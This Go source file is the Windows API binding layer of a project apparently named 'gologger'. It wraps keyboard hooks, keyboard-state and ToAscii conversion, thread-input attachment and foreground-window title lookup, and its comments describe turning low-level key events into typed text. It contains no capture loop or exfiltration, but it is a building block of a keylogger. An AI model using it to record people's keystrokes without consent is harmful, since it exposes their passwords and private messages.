package winapi

import (
	"syscall"
	"unsafe"

	"github.com/vgo0/gologger/wintypes"
	"golang.org/x/sys/windows"
)

var (
	user32              = windows.NewLazySystemDLL("user32.dll")
	setWindowsHookEx    = user32.NewProc("SetWindowsHookExA")
	callNextHookEx      = user32.NewProc("CallNextHookEx")
	unhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	unhookWinEvent      = user32.NewProc("UnhookWinEvent")
	getMessage          = user32.NewProc("GetMessageW")
	toAscii             = user32.NewProc("ToAscii")
	getKeyboardState    = user32.NewProc("GetKeyboardState")
	attachThreadInput   = user32.NewProc("AttachThreadInput")
	setWinEventHook     = user32.NewProc("SetWinEventHook")
	getWindowTextLength = user32.NewProc("GetWindowTextLengthW")
	getWindowText       = user32.NewProc("GetWindowTextW")
	getForegroundWindow = user32.NewProc("GetForegroundWindow")
	translateMessage    = user32.NewProc("TranslateMessage")
	dispatchMessage     = user32.NewProc("DispatchMessage")

	kernel32           = windows.NewLazySystemDLL("kernel32.dll")
	getCurrentThreadId = kernel32.NewProc("GetCurrentThreadId")
	getThreadId        = kernel32.NewProc("GetThreadId")
)

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow
HWND GetForegroundWindow();
Get currently active window if needed
*/
func GetForegroundWindow() wintypes.HWND {
	ret, _, _ := getForegroundWindow.Call()

	return wintypes.HWND(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextlengthw
int GetWindowTextLengthW(
  [in] HWND hWnd
);
Get length of window title to fetch via GetWindowText
*/
func GetWindowTextLength(hwnd wintypes.HWND) int {
	ret, _, _ := getWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowtextw
int GetWindowTextW(
  [in]  HWND   hWnd,
  [out] LPWSTR lpString,
  [in]  int    nMaxCount
);

Get window title (calls GetWindowTextLength and converts to string for you)
*/
func GetWindowText(hwnd wintypes.HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	getWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	title := syscall.UTF16ToString(buf)
	if title == "" {
		title = "Unknown"
	}
	return title
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadid
DWORD GetThreadId(
  [in] HANDLE Thread
);
*/
func GetThreadId(Thread wintypes.HANDLE) wintypes.DWORD {
	ret, _, _ := getThreadId.Call(uintptr(Thread))

	return wintypes.DWORD(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook
HWINEVENTHOOK SetWinEventHook(
  [in] DWORD        eventMin,
  [in] DWORD        eventMax,
  [in] HMODULE      hmodWinEventProc,
  [in] WINEVENTPROC pfnWinEventProc,
  [in] DWORD        idProcess,
  [in] DWORD        idThread,
  [in] DWORD        dwFlags
);

Used by us to detect changes in selected / foreground window via EVENT_OBJECT_FOCUS
*/
func SetWinEventHook(eventMin wintypes.DWORD, eventMax wintypes.DWORD, hmodWinEventProc wintypes.HMODULE, pfnWinEventProc wintypes.WINEVENTPROC, idProcess wintypes.DWORD, idThread wintypes.DWORD, dwFlags wintypes.DWORD) wintypes.HWINEVENTHOOK {
	ret, _, _ := setWinEventHook.Call(
		uintptr(eventMin),
		uintptr(eventMax),
		uintptr(hmodWinEventProc),
		uintptr(syscall.NewCallback(pfnWinEventProc)),
		uintptr(idProcess),
		uintptr(idThread),
		uintptr(dwFlags),
	)

	return wintypes.HWINEVENTHOOK(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-attachthreadinput
BOOL AttachThreadInput(
  [in] DWORD idAttach,
  [in] DWORD idAttachTo,
  [in] BOOL  fAttach
);

Used to allow our thread receiving low level keyboard events to get an accurate keyboard state for use in ToAscii
*/
func AttachThreadInput(idAttach wintypes.DWORD, idAttachTo wintypes.DWORD, fAttach wintypes.BOOL) wintypes.BOOL {
	ret, _, _ := attachThreadInput.Call(
		uintptr(idAttach),
		uintptr(idAttachTo),
		uintptr(fAttach),
	)

	return wintypes.BOOL(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthreadid
DWORD GetCurrentThreadId();
*/
func GetCurrentThreadId() wintypes.DWORD {
	ret, _, _ := getCurrentThreadId.Call()

	return wintypes.DWORD(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-toascii
int ToAscii(
  [in]           UINT       uVirtKey,
  [in]           UINT       uScanCode,
  [in, optional] const BYTE *lpKeyState,
  [out]          LPWORD     lpChar,
  [in]           UINT       uFlags
);

This is used to take a current keyboard state and the VkCode from a low level keyboard event and turn it into the real text
This approach takes care of things like taking into account if caps lock or shift keys are active
*/
func ToAscii(uVirtKey wintypes.DWORD, uScanCode wintypes.DWORD, lpKeyState *[256]byte, lpChar *uint16, uFlags wintypes.DWORD) int {
	ret, _, _ := toAscii.Call(
		uintptr(uVirtKey),
		uintptr(uScanCode),
		uintptr(unsafe.Pointer(&(*lpKeyState)[0])),
		uintptr(unsafe.Pointer(lpChar)),
		uintptr(uFlags),
	)

	return int(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate
BOOL GetKeyboardState(
  [out] PBYTE lpKeyState
);
*/
func GetKeyboardState(lpKeyState *[256]byte) wintypes.BOOL {
	ret, _, _ := getKeyboardState.Call(
		uintptr(unsafe.Pointer(&(*lpKeyState)[0])),
	)
	return wintypes.BOOL(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
*/
func SetWindowsHookEx(idHook int, lpfn wintypes.HOOKPROC, hMod wintypes.HINSTANCE, dwThreadId wintypes.DWORD) wintypes.HHOOK {
	ret, _, _ := setWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return wintypes.HHOOK(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex
BOOL UnhookWindowsHookEx(
  [in] HHOOK hhk
);
*/
func UnhookWindowsHookEx(hhk wintypes.HHOOK) bool {
	ret, _, _ := unhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwinevent
BOOL UnhookWinEvent(
  [in] HWINEVENTHOOK hWinEventHook
);
*/
func UnhookWinEvent(hWinEventHook wintypes.HWINEVENTHOOK) wintypes.BOOL {
	ret, _, _ := unhookWinEvent.Call(uintptr(hWinEventHook))

	return wintypes.BOOL(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex
LRESULT CallNextHookEx(
  [in, optional] HHOOK  hhk,
  [in]           int    nCode,
  [in]           WPARAM wParam,
  [in]           LPARAM lParam
);
*/
func CallNextHookEx(hhk wintypes.HHOOK, nCode int, wParam wintypes.WPARAM, lParam wintypes.LPARAM) wintypes.LRESULT {
	ret, _, _ := callNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return wintypes.LRESULT(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchmessage
LRESULT DispatchMessage(
  [in] const MSG *lpMsg
);
*/
func DispatchMessage(msg *wintypes.MSG) wintypes.LRESULT {
	ret, _, _ := dispatchMessage.Call(
		uintptr(unsafe.Pointer(msg)),
	)

	return wintypes.LRESULT(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-translatemessage
BOOL TranslateMessage(
  [in] const MSG *lpMsg
);
*/
func TranslateMessage(msg *wintypes.MSG) wintypes.BOOL {
	ret, _, _ := translateMessage.Call(
		uintptr(unsafe.Pointer(msg)),
	)

	return wintypes.BOOL(ret)
}

/*
https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessage
BOOL GetMessage(
  [out]          LPMSG lpMsg,
  [in, optional] HWND  hWnd,
  [in]           UINT  wMsgFilterMin,
  [in]           UINT  wMsgFilterMax
);
*/
func GetMessage(msg *wintypes.MSG, hwnd wintypes.HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := getMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}
